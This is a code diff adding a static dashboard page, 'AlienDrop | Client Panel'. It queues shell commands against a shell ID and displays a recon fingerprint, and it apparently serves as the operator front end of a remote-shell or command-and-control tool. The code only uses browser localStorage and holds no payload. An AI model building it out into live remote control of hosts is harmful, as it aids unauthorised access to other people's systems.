@@ -1,0 +1,118 @@
+<!-- MINC - Secure Static Client Dashboard -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>AlienDrop | Client Panel</title>
+  <style>
+    body {
+      background: #0f1115;
+      color: #e2faff;
+      font-family: monospace;
+      padding: 2em;
+    }
+    .container {
+      max-width: 800px;
+      margin: auto;
+      background: #1a1e25;
+      padding: 1.5em;
+      border: 1px solid #333;
+      border-radius: 6px;
+    }
+    input, button {
+      background: #222;
+      color: #e2faff;
+      border: 1px solid #444;
+      padding: 0.5em;
+      width: 100%;
+      margin-bottom: 1em;
+    }
+    .success { color: #66ff66; }
+    .error   { color: #ff4444; }
+    .info    { color: #71d9f2; }
+    pre {
+      background: #000;
+      color: #71d9f2;
+      padding: 1em;
+      overflow-x: auto;
+    }
+    .queued-commands {
+      margin-top: 1em;
+    }
+    .queued-commands li {
+      background: #111;
+      padding: 0.4em;
+      border-bottom: 1px solid #333;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>🔐 Secure Shell Access</h2>
+
+    <p><strong>Shell ID:</strong> <span id="shellId">[unlinked]</span></p>
+    <p><strong>Client ID:</strong> <span id="clientId">[unlinked]</span></p>
+
+    <label>Queue Command</label>
+    <input type="text" id="command" placeholder="whoami" />
+    <button onclick="queueCommand()">Send Command</button>
+    <div id="status" class="info"></div>
+
+    <h4>🧠 Recon Fingerprint</h4>
+    <pre id="recon">[loading]</pre>
+
+    <h4>📋 Queued Commands</h4>
+    <ul id="cmdList" class="queued-commands"></ul>
+  </div>
+
+  <script>
+    const transferData = JSON.parse(localStorage.getItem("client_transfer") || '{}');
+    const cmdQueueKey = `cmd_queue_${transferData.shell_id || 'unknown'}`;
+
+    const shell_id = transferData.shell_id || null;
+    const client_id = transferData.client_id || null;
+    const recon = transferData.recon || {};
+
+    document.getElementById("shellId").innerText = shell_id || "unlinked";
+    document.getElementById("clientId").innerText = client_id || "unlinked";
+    document.getElementById("recon").innerText = JSON.stringify(recon, null, 2);
+
+    const cmdList = document.getElementById("cmdList");
+
+    function loadQueue() {
+      const queue = JSON.parse(localStorage.getItem(cmdQueueKey) || '[]');
+      cmdList.innerHTML = '';
+      queue.forEach((cmd, i) => {
+        const li = document.createElement('li');
+        li.innerText = `${i + 1}. ${cmd}`;
+        cmdList.appendChild(li);
+      });
+    }
+
+    function queueCommand() {
+      const cmd = document.getElementById("command").value.trim();
+      if (!cmd || !shell_id) {
+        setStatus("Missing shell ID or command.", "error");
+        return;
+      }
+
+      const queue = JSON.parse(localStorage.getItem(cmdQueueKey) || '[]');
+      queue.push(cmd);
+      localStorage.setItem(cmdQueueKey, JSON.stringify(queue));
+
+      document.getElementById("command").value = "";
+      setStatus("✅ Command queued.", "success");
+      loadQueue();
+    }
+
+    function setStatus(msg, cls) {
+      const el = document.getElementById("status");
+      el.innerText = msg;
+      el.className = cls;
+    }
+
+    loadQueue();
+  </script>
+</body>
+</html>
+
